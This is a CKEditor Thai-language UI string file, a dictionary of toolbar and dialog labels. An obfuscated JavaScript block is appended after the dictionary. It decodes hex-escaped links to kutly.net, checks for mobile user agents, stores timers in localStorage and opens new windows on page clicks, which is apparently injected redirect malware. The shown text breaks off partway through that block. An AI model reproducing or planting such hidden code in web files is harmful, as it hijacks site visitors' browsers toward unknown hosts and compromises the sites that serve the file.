/*
Copyright (c) 2003-2010, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

/**
 * @fileOverview Defines the {@link CKEDITOR.lang} object, for the
 * Thai language.
 */

/**#@+
   @type String
   @example
*/

/**
 * Constains the dictionary of language entries.
 * @namespace
 */
CKEDITOR.lang['th'] =
{
	/**
	 * The language reading direction. Possible values are "rtl" for
	 * Right-To-Left languages (like Arabic) and "ltr" for Left-To-Right
	 * languages (like English).
	 * @default 'ltr'
	 */
	dir : 'ltr',

	/*
	 * Screenreader titles. Please note that screenreaders are not always capable
	 * of reading non-English words. So be careful while translating it.
	 */
	editorTitle		: 'Rich text editor, %1', // MISSING

	// Toolbar buttons without dialogs.
	source			: 'ดูรหัส HTML',
	newPage			: 'สร้างหน้าเอกสารใหม่',
	save			: 'บันทึก',
	preview			: 'ดูหน้าเอกสารตัวอย่าง',
	cut				: 'ตัด',
	copy			: 'สำเนา',
	paste			: 'วาง',
	print			: 'สั่งพิมพ์',
	underline		: 'ตัวขีดเส้นใต้',
	bold			: 'ตัวหนา',
	italic			: 'ตัวเอียง',
	selectAll		: 'เลือกทั้งหมด',
	removeFormat	: 'ล้างรูปแบบ',
	strike			: 'ตัวขีดเส้นทับ',
	subscript		: 'ตัวห้อย',
	superscript		: 'ตัวยก',
	horizontalrule	: 'แทรกเส้นคั่นบรรทัด',
	pagebreak		: 'แทรกตัวแบ่งหน้า Page Break',
	unlink			: 'ลบ ลิงค์',
	undo			: 'ยกเลิกคำสั่ง',
	redo			: 'ทำซ้ำคำสั่ง',

	// Common messages and labels.
	common :
	{
		browseServer	: 'เปิดหน้าต่างจัดการไฟล์อัพโหลด',
		url				: 'ที่อยู่อ้างอิง URL',
		protocol		: 'โปรโตคอล',
		upload			: 'อัพโหลดไฟล์',
		uploadSubmit	: 'อัพโหลดไฟล์ไปเก็บไว้ที่เครื่องแม่ข่าย (เซิร์ฟเวอร์)',
		image			: 'รูปภาพ',
		flash			: 'ไฟล์ Flash',
		form			: 'แบบฟอร์ม',
		checkbox		: 'เช็คบ๊อก',
		radio		: 'เรดิโอบัตตอน',
		textField		: 'เท็กซ์ฟิลด์',
		textarea		: 'เท็กซ์แอเรีย',
		hiddenField		: 'ฮิดเดนฟิลด์',
		button			: 'ปุ่ม',
		select	: 'แถบตัวเลือก',
		imageButton		: 'ปุ่มแบบรูปภาพ',
		notSet			: '<ไม่ระบุ>',
		id				: 'ไอดี',
		name			: 'ชื่อ',
		langDir			: 'การเขียน-อ่านภาษา',
		langDirLtr		: 'จากซ้ายไปขวา (LTR)',
		langDirRtl		: 'จากขวามาซ้าย (RTL)',
		langCode		: 'รหัสภาษา',
		longDescr		: 'คำอธิบายประกอบ URL',
		cssClass		: 'คลาสของไฟล์กำหนดลักษณะการแสดงผล',
		advisoryTitle	: 'คำเกริ่นนำ',
		cssStyle		: 'ลักษณะการแสดงผล',
		ok				: 'ตกลง',
		cancel			: 'ยกเลิก',
		generalTab		: 'General', // MISSING
		advancedTab		: 'ขั้นสูง',
		validateNumberFailed	: 'This value is not a number.', // MISSING
		confirmNewPage	: 'Any unsaved changes to this content will be lost. Are you sure you want to load new page?', // MISSING
		confirmCancel	: 'Some of the options have been changed. Are you sure to close the dialog?', // MISSING

		// Put the voice-only part of the label in the span.
		unavailable		: '%1<span class="cke_accessibility">, unavailable</span>' // MISSING
	},

	// Special char dialog.
	specialChar		:
	{
		toolbar		: 'แทรกตัวอักษรพิเศษ',
		title		: 'แทรกตัวอักษรพิเศษ'
	},

	// Link dialog.
	link :
	{
		toolbar		: 'แทรก/แก้ไข ลิงค์',
		menu		: 'แก้ไข ลิงค์',
		title		: 'ลิงค์เชื่อมโยงเว็บ อีเมล์ รูปภาพ หรือไฟล์อื่นๆ',
		info		: 'รายละเอียด',
		target		: 'การเปิดหน้าลิงค์',
		upload		: 'อัพโหลดไฟล์',
		advanced	: 'ขั้นสูง',
		type		: 'ประเภทของลิงค์',
		toAnchor	: 'จุดเชื่อมโยง (Anchor)',
		toEmail		: 'ส่งอีเมล์ (E-Mail)',
		target		: 'การเปิดหน้าลิงค์',
		targetNotSet	: '<ไม่ระบุ>',
		targetFrame	: '<เปิดในเฟรม>',
		targetPopup	: '<เปิดหน้าจอเล็ก (Pop-up)>',
		targetNew	: 'เปิดหน้าจอใหม่ (_blank)',
		targetTop	: 'เปิดในหน้าบนสุด (_top)',
		targetSelf	: 'เปิดในหน้าปัจจุบัน (_self)',
		targetParent	: 'เปิดในหน้าหลัก (_parent)',
		targetFrameName	: 'ชื่อทาร์เก็ตเฟรม',
		targetPopupName	: 'ระบุชื่อหน้าจอเล็ก (Pop-up)',
		popupFeatures	: 'คุณสมบัติของหน้าจอเล็ก (Pop-up)',
		popupResizable	: 'Resizable', // MISSING
		popupStatusBar	: 'แสดงแถบสถานะ',
		popupLocationBar	: 'แสดงที่อยู่ของไฟล์',
		popupToolbar	: 'แสดงแถบเครื่องมือ',
		popupMenuBar	: 'แสดงแถบเมนู',
		popupFullScreen	: 'แสดงเต็มหน้าจอ (IE5.5++ เท่านั้น)',
		popupScrollBars	: 'แสดงแถบเลื่อน',
		popupDependent	: 'แสดงเต็มหน้าจอ (Netscape)',
		popupWidth		: 'กว้าง',
		popupLeft		: 'พิกัดซ้าย (Left Position)',
		popupHeight		: 'สูง',
		popupTop		: 'พิกัดบน (Top Position)',
		id				: 'Id', // MISSING
		langDir			: 'การเขียน-อ่านภาษา',
		langDirNotSet	: '<ไม่ระบุ>',
		langDirLTR		: 'จากซ้ายไปขวา (LTR)',
		langDirRTL		: 'จากขวามาซ้าย (RTL)',
		acccessKey		: 'แอคเซส คีย์',
		name			: 'ชื่อ',
		langCode		: 'การเขียน-อ่านภาษา',
		tabIndex		: 'ลำดับของ แท็บ',
		advisoryTitle	: 'คำเกริ่นนำ',
		advisoryContentType	: 'ชนิดของคำเกริ่นนำ',
		cssClasses		: 'คลาสของไฟล์กำหนดลักษณะการแสดงผล',
		charset			: 'ลิงค์เชื่อมโยงไปยังชุดตัวอักษร',
		styles			: 'ลักษณะการแสดงผล',
		selectAnchor	: 'ระบุข้อมูลของจุดเชื่อมโยง (Anchor)',
		anchorName		: 'ชื่อ',
		anchorId		: 'ไอดี',
		emailAddress	: 'อีเมล์ (E-Mail)',
		emailSubject	: 'หัวเรื่อง',
		emailBody		: 'ข้อความ',
		noAnchors		: '(ยังไม่มีจุดเชื่อมโยงภายในหน้าเอกสารนี้)',
		noUrl			: 'กรุณาระบุที่อยู่อ้างอิงออนไลน์ (URL)',
		noEmail			: 'กรุณาระบุอีเมล์ (E-mail)'
	},

	// Anchor dialog
	anchor :
	{
		toolbar		: 'แทรก/แก้ไข Anchor',
		menu		: 'รายละเอียด Anchor',
		title		: 'รายละเอียด Anchor',
		name		: 'ชื่อ Anchor',
		errorName	: 'กรุณาระบุชื่อของ Anchor'
	},

	// Find And Replace Dialog
	findAndReplace :
	{
		title				: 'Find and Replace', // MISSING
		find				: 'ค้นหา',
		replace				: 'ค้นหาและแทนที่',
		findWhat			: 'ค้นหาคำว่า:',
		replaceWith			: 'แทนที่ด้วย:',
		notFoundMsg			: 'ไม่พบคำที่ค้นหา.',
		matchCase			: 'ตัวโหญ่-เล็ก ต้องตรงกัน',
		matchWord			: 'ต้องตรงกันทุกคำ',
		matchCyclic			: 'Match cyclic', // MISSING
		replaceAll			: 'แทนที่ทั้งหมดที่พบ',
		replaceSuccessMsg	: '%1 occurrence(s) replaced.' // MISSING
	},

	// Table Dialog
	table :
	{
		toolbar		: 'ตาราง',
		title		: 'คุณสมบัติของ ตาราง',
		menu		: 'คุณสมบัติของ ตาราง',
		deleteTable	: 'ลบตาราง',
		rows		: 'แถว',
		columns		: 'สดมน์',
		border		: 'ขนาดเส้นขอบ',
		align		: 'การจัดตำแหน่ง',
		alignNotSet	: '<ไม่ระบุ>',
		alignLeft	: 'ชิดซ้าย',
		alignCenter	: 'กึ่งกลาง',
		alignRight	: 'ชิดขวา',
		width		: 'กว้าง',
		widthPx		: 'จุดสี',
		widthPc		: 'เปอร์เซ็น',
		height		: 'สูง',
		cellSpace	: 'ระยะแนวนอนน',
		cellPad		: 'ระยะแนวตั้ง',
		caption		: 'หัวเรื่องของตาราง',
		summary		: 'สรุปความ',
		headers		: 'Headers', // MISSING
		headersNone		: 'None', // MISSING
		headersColumn	: 'First column', // MISSING
		headersRow		: 'First Row', // MISSING
		headersBoth		: 'Both', // MISSING
		invalidRows		: 'Number of rows must be a number greater than 0.', // MISSING
		invalidCols		: 'Number of columns must be a number greater than 0.', // MISSING
		invalidBorder	: 'Border size must be a number.', // MISSING
		invalidWidth	: 'Table width must be a number.', // MISSING
		invalidHeight	: 'Table height must be a number.', // MISSING
		invalidCellSpacing	: 'Cell spacing must be a number.', // MISSING
		invalidCellPadding	: 'Cell padding must be a number.', // MISSING

		cell :
		{
			menu			: 'ช่องตาราง',
			insertBefore	: 'Insert Cell Before', // MISSING
			insertAfter		: 'Insert Cell After', // MISSING
			deleteCell		: 'ลบช่อง',
			merge			: 'ผสานช่อง',
			mergeRight		: 'Merge Right', // MISSING
			mergeDown		: 'Merge Down', // MISSING
			splitHorizontal	: 'Split Cell Horizontally', // MISSING
			splitVertical	: 'Split Cell Vertically', // MISSING
			title			: 'Cell Properties', // MISSING
			cellType		: 'Cell Type', // MISSING
			rowSpan			: 'Rows Span', // MISSING
			colSpan			: 'Columns Span', // MISSING
			wordWrap		: 'Word Wrap', // MISSING
			hAlign			: 'Horizontal Alignment', // MISSING
			vAlign			: 'Vertical Alignment', // MISSING
			alignTop		: 'Top', // MISSING
			alignMiddle		: 'Middle', // MISSING
			alignBottom		: 'Bottom', // MISSING
			alignBaseline	: 'Baseline', // MISSING
			bgColor			: 'Background Color', // MISSING
			borderColor		: 'Border Color', // MISSING
			data			: 'Data', // MISSING
			header			: 'Header', // MISSING
			yes				: 'Yes', // MISSING
			no				: 'No', // MISSING
			invalidWidth	: 'Cell width must be a number.', // MISSING
			invalidHeight	: 'Cell height must be a number.', // MISSING
			invalidRowSpan	: 'Rows span must be a whole number.', // MISSING
			invalidColSpan	: 'Columns span must be a whole number.', // MISSING
			chooseColor : 'Choose' // MISSING
		},

		row :
		{
			menu			: 'แถว',
			insertBefore	: 'Insert Row Before', // MISSING
			insertAfter		: 'Insert Row After', // MISSING
			deleteRow		: 'ลบแถว'
		},

		column :
		{
			menu			: 'คอลัมน์',
			insertBefore	: 'Insert Column Before', // MISSING
			insertAfter		: 'Insert Column After', // MISSING
			deleteColumn	: 'ลบสดมน์'
		}
	},

	// Button Dialog.
	button :
	{
		title		: 'รายละเอียดของ ปุ่ม',
		text		: 'ข้อความ (ค่าตัวแปร)',
		type		: 'ข้อความ',
		typeBtn		: 'Button',
		typeSbm		: 'Submit',
		typeRst		: 'Reset'
	},

	// Checkbox and Radio Button Dialogs.
	checkboxAndRadio :
	{
		checkboxTitle : 'คุณสมบัติของ เช็คบ๊อก',
		radioTitle	: 'คุณสมบัติของ เรดิโอบัตตอน',
		value		: 'ค่าตัวแปร',
		selected	: 'เลือกเป็นค่าเริ่มต้น'
	},

	// Form Dialog.
	form :
	{
		title		: 'คุณสมบัติของ แบบฟอร์ม',
		menu		: 'คุณสมบัติของ แบบฟอร์ม',
		action		: 'แอคชั่น',
		method		: 'เมธอด',
		encoding	: 'Encoding', // MISSING
		target		: 'การเปิดหน้าลิงค์',
		targetNotSet	: '<ไม่ระบุ>',
		targetNew	: 'เปิดหน้าจอใหม่ (_blank)',
		targetTop	: 'เปิดในหน้าบนสุด (_top)',
		targetSelf	: 'เปิดในหน้าปัจจุบัน (_self)',
		targetParent	: 'เปิดในหน้าหลัก (_parent)'
	},

	// Select Field Dialog.
	select :
	{
		title		: 'คุณสมบัติของ แถบตัวเลือก',
		selectInfo	: 'อินโฟ',
		opAvail		: 'รายการตัวเลือก',
		value		: 'ค่าตัวแปร',
		size		: 'ขนาด',
		lines		: 'บรรทัด',
		chkMulti	: 'เลือกหลายค่าได้',
		opText		: 'ข้อความ',
		opValue		: 'ค่าตัวแปร',
		btnAdd		: 'เพิ่ม',
		btnModify	: 'แก้ไข',
		btnUp		: 'บน',
		btnDown		: 'ล่าง',
		btnSetValue : 'เลือกเป็นค่าเริ่มต้น',
		btnDelete	: 'ลบ'
	},

	// Textarea Dialog.
	textarea :
	{
		title		: 'คุณสมบัติของ เท็กแอเรีย',
		cols		: 'สดมภ์',
		rows		: 'แถว'
	},

	// Text Field Dialog.
	textfield :
	{
		title		: 'คุณสมบัติของ เท็กซ์ฟิลด์',
		name		: 'ชื่อ',
		value		: 'ค่าตัวแปร',
		charWidth	: 'ความกว้าง',
		maxChars	: 'จำนวนตัวอักษรสูงสุด',
		type		: 'ชนิด',
		typeText	: 'ข้อความ',
		typePass	: 'รหัสผ่าน'
	},

	// Hidden Field Dialog.
	hidden :
	{
		title	: 'คุณสมบัติของ ฮิดเดนฟิลด์',
		name	: 'ชื่อ',
		value	: 'ค่าตัวแปร'
	},

	// Image Dialog.
	image :
	{
		title		: 'คุณสมบัติของ รูปภาพ',
		titleButton	: 'คุณสมบัติของ ปุ่มแบบรูปภาพ',
		menu		: 'คุณสมบัติของ รูปภาพ',
		infoTab	: 'ข้อมูลของรูปภาพ',
		btnUpload	: 'อัพโหลดไฟล์ไปเก็บไว้ที่เครื่องแม่ข่าย (เซิร์ฟเวอร์)',
		url		: 'ที่อยู่อ้างอิง URL',
		upload	: 'อัพโหลดไฟล์',
		alt		: 'คำประกอบรูปภาพ',
		width		: 'ความกว้าง',
		height	: 'ความสูง',
		lockRatio	: 'กำหนดอัตราส่วน กว้าง-สูง แบบคงที่',
		resetSize	: 'กำหนดรูปเท่าขนาดจริง',
		border	: 'ขนาดขอบรูป',
		hSpace	: 'ระยะแนวนอน',
		vSpace	: 'ระยะแนวตั้ง',
		align		: 'การจัดวาง',
		alignLeft	: 'ชิดซ้าย',
		alignRight	: 'ชิดขวา',
		preview	: 'หน้าเอกสารตัวอย่าง',
		alertUrl	: 'กรุณาระบุที่อยู่อ้างอิงออนไลน์ของไฟล์รูปภาพ (URL)',
		linkTab	: 'ลิ้งค์',
		button2Img	: 'Do you want to transform the selected image button on a simple image?', // MISSING
		img2Button	: 'Do you want to transform the selected image on a image button?', // MISSING
		urlMissing : 'Image source URL is missing.' // MISSING
	},

	// Flash Dialog
	flash :
	{
		properties		: 'คุณสมบัติของไฟล์ Flash',
		propertiesTab	: 'Properties', // MISSING
		title		: 'คุณสมบัติของไฟล์ Flash',
		chkPlay		: 'เล่นอัตโนมัติ Auto Play',
		chkLoop		: 'เล่นวนรอบ Loop',
		chkMenu		: 'ให้ใช้งานเมนูของ Flash',
		chkFull		: 'Allow Fullscreen', // MISSING
 		scale		: 'อัตราส่วน Scale',
		scaleAll		: 'แสดงให้เห็นทั้งหมด Show all',
		scaleNoBorder	: 'ไม่แสดงเส้นขอบ No Border',
		scaleFit		: 'แสดงให้พอดีกับพื้นที่ Exact Fit',
		access			: 'Script Access', // MISSING
		accessAlways	: 'Always', // MISSING
		accessSameDomain	: 'Same domain', // MISSING
		accessNever	: 'Never', // MISSING
		align		: 'การจัดวาง',
		alignLeft	: 'ชิดซ้าย',
		alignAbsBottom: 'ชิดด้านล่างสุด',
		alignAbsMiddle: 'กึ่งกลาง',
		alignBaseline	: 'ชิดบรรทัด',
		alignBottom	: 'ชิดด้านล่าง',
		alignMiddle	: 'กึ่งกลางแนวตั้ง',
		alignRight	: 'ชิดขวา',
		alignTextTop	: 'ใต้ตัวอักษร',
		alignTop	: 'บนสุด',
		quality		: 'Quality', // MISSING
		qualityBest		 : 'Best', // MISSING
		qualityHigh		 : 'High', // MISSING
		qualityAutoHigh	 : 'Auto High', // MISSING
		qualityMedium	 : 'Medium', // MISSING
		qualityAutoLow	 : 'Auto Low', // MISSING
		qualityLow		 : 'Low', // MISSING
		windowModeWindow	 : 'Window', // MISSING
		windowModeOpaque	 : 'Opaque', // MISSING
		windowModeTransparent	 : 'Transparent', // MISSING
		windowMode	: 'Window mode', // MISSING
		flashvars	: 'Variables for Flash', // MISSING
		bgcolor	: 'สีพื้นหลัง',
		width	: 'ความกว้าง',
		height	: 'ความสูง',
		hSpace	: 'ระยะแนวนอน',
		vSpace	: 'ระยะแนวตั้ง',
		validateSrc : 'กรุณาระบุที่อยู่อ้างอิงออนไลน์ (URL)',
		validateWidth : 'Width must be a number.', // MISSING
		validateHeight : 'Height must be a number.', // MISSING
		validateHSpace : 'HSpace must be a number.', // MISSING
		validateVSpace : 'VSpace must be a number.' // MISSING
	},

	// Speller Pages Dialog
	spellCheck :
	{
		toolbar			: 'ตรวจการสะกดคำ',
		title			: 'Spell Check', // MISSING
		notAvailable	: 'Sorry, but service is unavailable now.', // MISSING
		errorLoading	: 'Error loading application service host: %s.', // MISSING
		notInDic		: 'ไม่พบในดิกชันนารี',
		changeTo		: 'แก้ไขเป็น',
		btnIgnore		: 'ยกเว้น',
		btnIgnoreAll	: 'ยกเว้นทั้งหมด',
		btnReplace		: 'แทนที่',
		btnReplaceAll	: 'แทนที่ทั้งหมด',
		btnUndo			: 'ยกเลิก',
		noSuggestions	: '- ไม่มีคำแนะนำใดๆ -',
		progress		: 'กำลังตรวจสอบคำสะกด...',
		noMispell		: 'ตรวจสอบคำสะกดเสร็จสิ้น: ไม่พบคำสะกดผิด',
		noChanges		: 'ตรวจสอบคำสะกดเสร็จสิ้น: ไม่มีการแก้คำใดๆ',
		oneChange		: 'ตรวจสอบคำสะกดเสร็จสิ้น: แก้ไข1คำ',
		manyChanges		: 'ตรวจสอบคำสะกดเสร็จสิ้น:: แก้ไข %1 คำ',
		ieSpellDownload	: 'ไม่ได้ติดตั้งระบบตรวจสอบคำสะกด. ต้องการติดตั้งไหมครับ?'
	},

	smiley :
	{
		toolbar	: 'รูปสื่ออารมณ์',
		title	: 'แทรกสัญลักษณ์สื่ออารมณ์'
	},

	elementsPath :
	{
		eleTitle : '%1 element' // MISSING
	},

	numberedlist : 'ลำดับรายการแบบตัวเลข',
	bulletedlist : 'ลำดับรายการแบบสัญลักษณ์',
	indent : 'เพิ่มระยะย่อหน้า',
	outdent : 'ลดระยะย่อหน้า',

	justify :
	{
		left : 'จัดชิดซ้าย',
		center : 'จัดกึ่งกลาง',
		right : 'จัดชิดขวา',
		block : 'จัดพอดีหน้ากระดาษ'
	},

	blockquote : 'Blockquote', // MISSING

	clipboard :
	{
		title		: 'วาง',
		cutError	: 'ไม่สามารถตัดข้อความที่เลือกไว้ได้เนื่องจากการกำหนดค่าระดับความปลอดภัย. กรุณาใช้ปุ่มลัดเพื่อวางข้อความแทน (กดปุ่ม Ctrl และตัว X พร้อมกัน).',
		copyError	: 'ไม่สามารถสำเนาข้อความที่เลือกไว้ได้เนื่องจากการกำหนดค่าระดับความปลอดภัย. กรุณาใช้ปุ่มลัดเพื่อวางข้อความแทน (กดปุ่ม Ctrl และตัว C พร้อมกัน).',
		pasteMsg	: 'กรุณาใช้คีย์บอร์ดเท่านั้น โดยกดปุ๋ม (<strong>Ctrl และ V</strong>)พร้อมๆกัน และกด <strong>OK</strong>.',
		securityMsg	: 'Because of your browser security settings, the editor is not able to access your clipboard data directly. You are required to paste it again in this window.' // MISSING
	},

	pastefromword :
	{
		confirmCleanup : 'The text you want to paste seems to be copied from Word. Do you want to clean it before pasting?', // MISSING
		toolbar : 'วางสำเนาจากตัวอักษรเวิร์ด',
		title : 'วางสำเนาจากตัวอักษรเวิร์ด',
		error : 'It was not possible to clean up the pasted data due to an internal error' // MISSING
	},

	pasteText :
	{
		button : 'วางแบบตัวอักษรธรรมดา',
		title : 'วางแบบตัวอักษรธรรมดา'
	},

	templates :
	{
		button : 'เทมเพลต',
		title : 'เทมเพลตของส่วนเนื้อหาเว็บไซต์',
		insertOption: 'แทนที่เนื้อหาเว็บไซต์ที่เลือก',
		selectPromptMsg: 'กรุณาเลือก เทมเพลต เพื่อนำไปแก้ไขในอีดิตเตอร์<br />(เนื้อหาส่วนนี้จะหายไป):',
		emptyListMsg : '(ยังไม่มีการกำหนดเทมเพลต)'
	},

	showBlocks : 'Show Blocks', // MISSING

	stylesCombo :
	{
		label : 'ลักษณะ',
		voiceLabel : 'Styles', // MISSING
		panelVoiceLabel : 'Select a style', // MISSING
		panelTitle1 : 'Block Styles', // MISSING
		panelTitle2 : 'Inline Styles', // MISSING
		panelTitle3 : 'Object Styles' // MISSING
	},

	format :
	{
		label : 'รูปแบบ',
		voiceLabel : 'Format', // MISSING
		panelTitle : 'รูปแบบ',
		panelVoiceLabel : 'Select a paragraph format', // MISSING

		tag_p : 'Normal',
		tag_pre : 'Formatted',
		tag_address : 'Address',
		tag_h1 : 'Heading 1',
		tag_h2 : 'Heading 2',
		tag_h3 : 'Heading 3',
		tag_h4 : 'Heading 4',
		tag_h5 : 'Heading 5',
		tag_h6 : 'Heading 6',
		tag_div : 'Paragraph (DIV)'
	},

	div :
	{
		title				: 'Create Div Container', // MISSING
		toolbar				: 'Create Div Container', // MISSING
		cssClassInputLabel	: 'Stylesheet Classes', // MISSING
		styleSelectLabel	: 'Style', // MISSING
		IdInputLabel		: 'Id', // MISSING
		languageCodeInputLabel	: ' Language Code', // MISSING
		inlineStyleInputLabel	: 'Inline Style', // MISSING
		advisoryTitleInputLabel	: 'Advisory Title', // MISSING
		langDirLabel		: 'Language Direction', // MISSING
		langDirLTRLabel		: 'Left to Right (LTR)', // MISSING
		langDirRTLLabel		: 'Right to Left (RTL)', // MISSING
		edit				: 'Edit Div', // MISSING
		remove				: 'Remove Div' // MISSING
  	},

	font :
	{
		label : 'แบบอักษร',
		voiceLabel : 'Font', // MISSING
		panelTitle : 'แบบอักษร',
		panelVoiceLabel : 'Select a font' // MISSING
	},

	fontSize :
	{
		label : 'ขนาด',
		voiceLabel : 'Font Size', // MISSING
		panelTitle : 'ขนาด',
		panelVoiceLabel : 'Select a font size' // MISSING
	},

	colorButton :
	{
		textColorTitle : 'สีตัวอักษร',
		bgColorTitle : 'สีพื้นหลัง',
		auto : 'สีอัตโนมัติ',
		more : 'เลือกสีอื่นๆ...'
	},

	colors :
	{
		'000' : 'Black', // MISSING
		'800000' : 'Maroon', // MISSING
		'8B4513' : 'Saddle Brown', // MISSING
		'2F4F4F' : 'Dark Slate Gray', // MISSING
		'008080' : 'Teal', // MISSING
		'000080' : 'Navy', // MISSING
		'4B0082' : 'Indigo', // MISSING
		'696969' : 'Dim Gray', // MISSING
		'B22222' : 'Fire Brick', // MISSING
		'A52A2A' : 'Brown', // MISSING
		'DAA520' : 'Golden Rod', // MISSING
		'006400' : 'Dark Green', // MISSING
		'40E0D0' : 'Turquoise', // MISSING
		'0000CD' : 'Medium Blue', // MISSING
		'800080' : 'Purple', // MISSING
		'808080' : 'Gray', // MISSING
		'F00' : 'Red', // MISSING
		'FF8C00' : 'Dark Orange', // MISSING
		'FFD700' : 'Gold', // MISSING
		'008000' : 'Green', // MISSING
		'0FF' : 'Cyan', // MISSING
		'00F' : 'Blue', // MISSING
		'EE82EE' : 'Violet', // MISSING
		'A9A9A9' : 'Dark Gray', // MISSING
		'FFA07A' : 'Light Salmon', // MISSING
		'FFA500' : 'Orange', // MISSING
		'FFFF00' : 'Yellow', // MISSING
		'00FF00' : 'Lime', // MISSING
		'AFEEEE' : 'Pale Turquoise', // MISSING
		'ADD8E6' : 'Light Blue', // MISSING
		'DDA0DD' : 'Plum', // MISSING
		'D3D3D3' : 'Light Grey', // MISSING
		'FFF0F5' : 'Lavender Blush', // MISSING
		'FAEBD7' : 'Antique White', // MISSING
		'FFFFE0' : 'Light Yellow', // MISSING
		'F0FFF0' : 'Honeydew', // MISSING
		'F0FFFF' : 'Azure', // MISSING
		'F0F8FF' : 'Alice Blue', // MISSING
		'E6E6FA' : 'Lavender', // MISSING
		'FFF' : 'White' // MISSING
	},

	scayt :
	{
		title : 'Spell Check As You Type', // MISSING
		enable : 'Enable SCAYT', // MISSING
		disable : 'Disable SCAYT', // MISSING
		about : 'About SCAYT', // MISSING
		toggle : 'Toggle SCAYT', // MISSING
		options : 'Options', // MISSING
		langs : 'Languages', // MISSING
		moreSuggestions : 'More suggestions', // MISSING
		ignore : 'Ignore', // MISSING
		ignoreAll : 'Ignore All', // MISSING
		addWord : 'Add Word', // MISSING
		emptyDic : 'Dictionary name should not be empty.', // MISSING
		optionsTab : 'Options', // MISSING
		languagesTab : 'Languages', // MISSING
		dictionariesTab : 'Dictionaries', // MISSING
		aboutTab : 'About' // MISSING
	},

	about :
	{
		title : 'About CKEditor', // MISSING
		dlgTitle : 'About CKEditor', // MISSING
		moreInfo : 'For licensing information please visit our web site:', // MISSING
		copy : 'Copyright &copy; $1. All rights reserved.' // MISSING
	},

	maximize : 'Maximize', // MISSING
	minimize : 'Minimize', // MISSING

	fakeobjects :
	{
		anchor : 'Anchor', // MISSING
		flash : 'Flash Animation', // MISSING
		div : 'Page Break', // MISSING
		unknown : 'Unknown Object' // MISSING
	},

	resize : 'Drag to resize', // MISSING

	colordialog :
	{
		title : 'Select color', // MISSING
		highlight : 'Highlight', // MISSING
		selected : 'Selected', // MISSING
		clear : 'Clear' // MISSING
	},

	toolbarCollapse : 'Collapse Toolbar', // MISSING
	toolbarExpand : 'Expand Toolbar' // MISSING
};
function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a 